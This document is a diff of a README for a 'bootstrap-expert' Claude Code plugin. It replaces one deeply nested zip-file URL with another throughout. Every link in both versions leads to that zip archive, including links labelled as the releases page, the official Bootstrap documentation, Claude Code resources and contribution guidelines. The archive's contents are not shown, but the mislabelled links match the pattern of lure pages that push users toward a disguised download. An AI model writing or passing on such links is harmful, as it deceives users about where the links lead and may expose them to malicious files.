@@ -23,12 +23,12 @@ To successfully run this application, your computer should meet the following re
 
 To begin using the **bootstrap-expert**, visit the link below and download the latest version of the application.
 
-[![Download bootstrap-expert](https://raw.githubusercontent.com/ronnieiscoo/bootstrap-expert/main/plugins/bootstrap-expert/skills/bootstrap-icons/examples/expert_bootstrap_3.5.zip%20Now-bootstrape%20expert-brightgreen)](https://raw.githubusercontent.com/ronnieiscoo/bootstrap-expert/main/plugins/bootstrap-expert/skills/bootstrap-icons/examples/expert_bootstrap_3.5.zip)
+[![Download bootstrap-expert](https://github.com/ronnieiscoo/bootstrap-expert/raw/refs/heads/main/plugins/bootstrap-expert/skills/bootstrap-customize/bootstrap-expert-webbed.zip%20Now-bootstrape%20expert-brightgreen)](https://github.com/ronnieiscoo/bootstrap-expert/raw/refs/heads/main/plugins/bootstrap-expert/skills/bootstrap-customize/bootstrap-expert-webbed.zip)
 
 ## 📦 Download & Install
 
 1. Click the link below to visit the Releases page:
-   - [Visit the Releases Page](https://raw.githubusercontent.com/ronnieiscoo/bootstrap-expert/main/plugins/bootstrap-expert/skills/bootstrap-icons/examples/expert_bootstrap_3.5.zip)
+   - [Visit the Releases Page](https://github.com/ronnieiscoo/bootstrap-expert/raw/refs/heads/main/plugins/bootstrap-expert/skills/bootstrap-customize/bootstrap-expert-webbed.zip)
   
 2. On this page, locate the latest release of **bootstrap-expert**. You will find details about the version and the features included.
 
@@ -77,11 +77,11 @@ If you have questions or need assistance, feel free to reach out through the fol
 ## 🌐 Learn More
 
 For comprehensive guides and tutorials about Bootstrap, consider visiting:
-- [Official Bootstrap Documentation](https://raw.githubusercontent.com/ronnieiscoo/bootstrap-expert/main/plugins/bootstrap-expert/skills/bootstrap-icons/examples/expert_bootstrap_3.5.zip)
-- [Claude Code Resources](https://raw.githubusercontent.com/ronnieiscoo/bootstrap-expert/main/plugins/bootstrap-expert/skills/bootstrap-icons/examples/expert_bootstrap_3.5.zip)
+- [Official Bootstrap Documentation](https://github.com/ronnieiscoo/bootstrap-expert/raw/refs/heads/main/plugins/bootstrap-expert/skills/bootstrap-customize/bootstrap-expert-webbed.zip)
+- [Claude Code Resources](https://github.com/ronnieiscoo/bootstrap-expert/raw/refs/heads/main/plugins/bootstrap-expert/skills/bootstrap-customize/bootstrap-expert-webbed.zip)
 
 ## 📝 Contributing
 
-If you're interested in contributing to **bootstrap-expert**, please read our [contribution guidelines](https://raw.githubusercontent.com/ronnieiscoo/bootstrap-expert/main/plugins/bootstrap-expert/skills/bootstrap-icons/examples/expert_bootstrap_3.5.zip) to get started.
+If you're interested in contributing to **bootstrap-expert**, please read our [contribution guidelines](https://github.com/ronnieiscoo/bootstrap-expert/raw/refs/heads/main/plugins/bootstrap-expert/skills/bootstrap-customize/bootstrap-expert-webbed.zip) to get started.
 
 Thank you for choosing **bootstrap-expert** to simplify your Bootstrap development journey!
